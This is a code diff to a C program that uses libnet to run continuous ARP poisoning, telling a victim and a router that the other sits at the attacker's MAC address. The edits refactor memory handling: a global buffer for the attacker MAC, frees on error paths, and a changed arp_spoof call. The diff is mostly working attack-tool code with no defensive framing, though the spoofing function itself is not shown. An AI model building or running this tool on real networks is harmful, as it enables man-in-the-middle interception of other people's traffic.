@@ -9,6 +9,8 @@
 libnet_t *l = NULL; 
 device *victim = NULL;
 device *router = NULL;
+uint8_t *attacker_mac_addr = NULL;
+
 
 // ---------
 // MAIN
@@ -24,6 +26,8 @@ int main(int argc, char *argv[]) {
     // Check if the required number of arguments (5 + program name) is provided
     if (argc != 6) {
         fprintf(stderr, "Use: %s <Victim_IP> <Victim_MAC> <Router_IP> <Router_MAC> <Web_Interface>\n", argv[0]);
+        free(victim);
+        free(router);
         return 1;
     }
 
@@ -32,7 +36,10 @@ int main(int argc, char *argv[]) {
     l = libnet_init(LIBNET_LINK, iface_name, errbuf);
     if (l == NULL) {
         fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
-        return 1;    // Convert MAC string (argv[4]) to binary 6-byte array
+        free(victim);
+        free(router);
+        libnet_destroy(l);
+        return 1;   
     }
 
 
@@ -55,17 +62,32 @@ int main(int argc, char *argv[]) {
     struct libnet_ether_addr *mac_ptr = libnet_get_hwaddr(l);
     if (mac_ptr == NULL) {
         fprintf(stderr, "Could not determine attacker's MAC address (libnet_get_hwaddr failed).\n");
+        free(victim);
+        free(router);
         libnet_destroy(l);
         return 1;
     }
 
-    // Copy the attacker's MAC address into a local array
-    uint8_t attacker_mac_addr[6];
-    memcpy(attacker_mac_addr, mac_ptr, 6);
+    // Memory allocation for attacker's MAC address global variable
+    attacker_mac_addr = (uint8_t *)malloc(HARDWARE_ADDR_SIZE); 
+    if (attacker_mac_addr == NULL) {
+        perror("malloc");
+        free(victim);
+        free(router);
+        free(attacker_mac_addr);
+        libnet_destroy(l);
+        return 1;
+    }
+
+    // Copy the attacker's MAC address into the global variable
+    memcpy(attacker_mac_addr, mac_ptr->ether_addr_octet, HARDWARE_ADDR_SIZE);
 
     // Set up the signal handler for Ctrl+C (SIGINT) cleanup
     if (signal(SIGINT, cleanup_and_exit) == SIG_ERR) {
         fprintf(stderr, "Can't catch SIGINT: %s\n", strerror(errno));
+        free(victim);
+        free(router);
+        free(attacker_mac_addr);
         libnet_destroy(l);
         return 1;
     }
@@ -79,14 +101,17 @@ int main(int argc, char *argv[]) {
     // Main loop for continuous ARP poisoning
     while (1) {
         // Tell the Victim that the Router is HERE (at Attacker's MAC)
-        arp_spoof(router, victim, attacker_mac_addr, iface_name);
+        arp_spoof(router, victim, iface_name);
 
         // Tell the Router that the Victim is HERE (at Attacker's MAC)
-        arp_spoof(victim, router, attacker_mac_addr, iface_name);
+        arp_spoof(victim, router, iface_name);
 
         sleep(2);
     }
 
+    free(victim);
+    free(router);
+    free(attacker_mac_addr);
     libnet_destroy(l);
     return 0;
 }
